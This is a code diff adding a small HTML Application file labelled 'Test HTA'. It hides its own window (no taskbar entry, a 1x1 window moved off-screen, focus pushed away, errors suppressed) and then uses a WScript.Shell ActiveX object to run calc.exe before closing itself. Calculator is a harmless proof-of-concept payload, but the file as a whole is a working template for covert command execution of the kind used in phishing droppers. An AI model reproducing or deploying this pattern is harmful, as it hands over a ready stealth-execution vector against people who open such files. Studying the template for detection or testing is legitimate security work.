@@ -1,0 +1,28 @@
+<html> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HTA:APPLICATION caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no">
+<head> 
+
+    <title>Test HTA</title>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=9">
+    
+    <script language="javascript">
+ window.resizeTo(1, 1);
+ window.moveTo(-2000, -2000);
+ window.blur();
+ try
+ {
+  window.onfocus = function() { window.blur(); }
+  window.onerror = function(sMsg, sUrl, sLine) { return false; }
+ }
+ catch (e){}
+
+    var shell = new ActiveXObject('WScript.Shell');
+    shell.run("calc.exe");
+    </script>
+</head> 
+<body>
+ <script>self.close();</script>
+</body>
+</html>
